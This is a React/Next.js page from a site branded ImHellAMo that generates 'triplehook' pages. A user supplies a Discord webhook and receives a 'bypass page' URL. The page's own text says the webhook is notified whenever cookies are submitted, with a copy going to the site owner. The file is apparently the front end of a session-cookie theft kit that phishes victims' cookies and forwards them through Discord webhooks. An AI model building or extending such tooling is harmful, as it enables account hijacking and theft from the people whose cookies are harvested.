'use client';

import { useState } from 'react';
import Link from 'next/link';
import { ArrowLeft, Loader2, CheckCircle, AlertCircle, Copy } from 'lucide-react';

export default function TriplehookGeneratorPage() {
  const [directory, setDirectory] = useState('');
  const [webhook1, setWebhook1] = useState('');
  const [discordServer, setDiscordServer] = useState('https://discord.gg/xDQmmHKAxx');
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');
  const [generatedData, setGeneratedData] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!directory.trim() || !webhook1.trim()) {
      setError('Please fill in all required fields');
      return;
    }

    setLoading(true);
    setError('');
    setSuccess(false);

    try {
      const response = await fetch('/api/triplehook', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'create',
          directory: directory.trim(),
          webhook1: webhook1.trim(),
          discord_server: discordServer || 'https://discord.gg/xDQmmHKAxx',
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || 'Failed to create triplehook');
      }

      setGeneratedData(data.data);
      setSuccess(true);
      setDirectory('');
      setWebhook1('');
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An error occurred');
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-50 glass-effect border-b backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
          <Link href="/" className="text-xl font-bold gradient-text">
            ImHellAMo
          </Link>
          <Link href="/" className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors btn-icon">
            <ArrowLeft className="w-4 h-4" />
            Back
          </Link>
        </div>
      </nav>

      {/* Main Content */}
      <div className="pt-32 pb-20 px-4 min-h-screen flex items-center justify-center">
        <div className="w-full max-w-2xl">
          <div className="mb-8 text-center">
            <h1 className="text-4xl md:text-5xl font-bold mb-3">Triplehook Generator</h1>
            <p className="text-muted-foreground text-lg">Create a new webhook distribution system</p>
          </div>

          {!success ? (
            <form onSubmit={handleSubmit} className="glass-effect rounded-xl p-8 space-y-6">
              <div>
                <label className="block text-sm font-semibold mb-3">
                  Directory Name
                </label>
                <input
                  type="text"
                  value={directory}
                  onChange={(e) => setDirectory(e.target.value)}
                  placeholder="e.g., mystore, gameshop, sellers"
                  className="input-base"
                  disabled={loading}
                  pattern="[a-zA-Z0-9_-]+"
                />
                <p className="text-xs text-muted-foreground mt-2">
                  This becomes your main bypass page URL path. Letters, numbers, hyphens, and underscores only.
                </p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-3">
                  Your Webhook URL
                </label>
                <input
                  type="url"
                  value={webhook1}
                  onChange={(e) => setWebhook1(e.target.value)}
                  placeholder="https://discord.com/api/webhooks/..."
                  className="input-base"
                  disabled={loading}
                />
                <p className="text-xs text-muted-foreground mt-2">
                  Your personal Discord webhook. Notifications will be sent here.
                </p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-3">
                  Discord Server Invite (Optional)
                </label>
                <input
                  type="url"
                  value={discordServer}
                  onChange={(e) => setDiscordServer(e.target.value)}
                  placeholder="https://discord.gg/..."
                  className="input-base"
                  disabled={loading}
                />
                <p className="text-xs text-muted-foreground mt-2">
                  Discord server link for users to join. Defaults to main ImHellAMo server.
                </p>
              </div>

              {error && (
                <div className="flex gap-3 p-4 rounded-lg" style={{backgroundColor: 'rgba(239, 68, 68, 0.1)', borderColor: 'rgba(239, 68, 68, 0.5)'}}>
                  <AlertCircle className="w-5 h-5 text-error flex-shrink-0 mt-0.5" />
                  <div className="text-error text-sm">{error}</div>
                </div>
              )}

              <button
                type="submit"
                disabled={loading || !directory.trim() || !webhook1.trim()}
                className="w-full btn-primary py-3 font-semibold flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Creating...
                  </>
                ) : (
                  'Create Triplehook'
                )}
              </button>

              <div className="text-xs text-muted-foreground text-center">
                Your webhook will receive notifications when cookies are submitted
              </div>
            </form>
          ) : generatedData ? (
            <div className="glass-effect rounded-xl p-8 space-y-6">
              <div className="flex gap-3 p-4 rounded-lg" style={{backgroundColor: 'rgba(16, 185, 129, 0.1)', borderColor: 'rgba(16, 185, 129, 0.5)'}}>
                <CheckCircle className="w-5 h-5 text-success flex-shrink-0 mt-0.5" />
                <div className="text-success text-sm">Triplehook created successfully!</div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="text-sm font-semibold text-muted-foreground mb-2 block">
                    Generated ID
                  </label>
                  <div className="bg-input rounded-lg p-3 flex items-center justify-between">
                    <code className="text-sm font-mono text-foreground">{generatedData.id}</code>
                    <button
                      onClick={() => copyToClipboard(generatedData.id)}
                      className="btn-icon text-muted-foreground hover:text-foreground"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div>
                  <label className="text-sm font-semibold text-muted-foreground mb-2 block">
                    Security Token (Keep Secret)
                  </label>
                  <div className="bg-input rounded-lg p-3 flex items-center justify-between">
                    <code className="text-sm font-mono text-foreground truncate">
                      {generatedData.token}
                    </code>
                    <button
                      onClick={() => copyToClipboard(generatedData.token)}
                      className="btn-icon text-muted-foreground hover:text-foreground flex-shrink-0"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div>
                  <label className="text-sm font-semibold text-muted-foreground mb-2 block">
                    Page URL
                  </label>
                  <div className="bg-input rounded-lg p-3 flex items-center justify-between">
                    <code className="text-sm font-mono text-foreground truncate">
                      {`https://${typeof window !== 'undefined' ? window.location.host : 'yoursite.com'}/triplehook/${generatedData.directory}`}
                    </code>
                    <button
                      onClick={() => copyToClipboard(
                        `https://${typeof window !== 'undefined' ? window.location.host : 'yoursite.com'}/triplehook/${generatedData.directory}`
                      )}
                      className="btn-icon text-muted-foreground hover:text-foreground flex-shrink-0"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div className="card-base rounded-lg" style={{borderColor: 'rgba(59, 130, 246, 0.5)', backgroundColor: 'rgba(59, 130, 246, 0.05)'}}>
                  <p className="text-sm text-muted-foreground mb-3">
                    <strong>Webhook Setup:</strong> Your webhook will receive notifications when:
                  </p>
                  <ul className="text-sm text-muted-foreground space-y-1">
                    <li>• A new cookie is submitted to your triplehook</li>
                    <li>• A request succeeds or fails</li>
                    <li>• The website owner also receives a copy of the notification</li>
                  </ul>
                </div>
              </div>

              <button
                onClick={() => {
                  setSuccess(false);
                  setGeneratedData(null);
                }}
                className="w-full btn-secondary py-3 font-semibold"
              >
                Create Another
              </button>
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
}
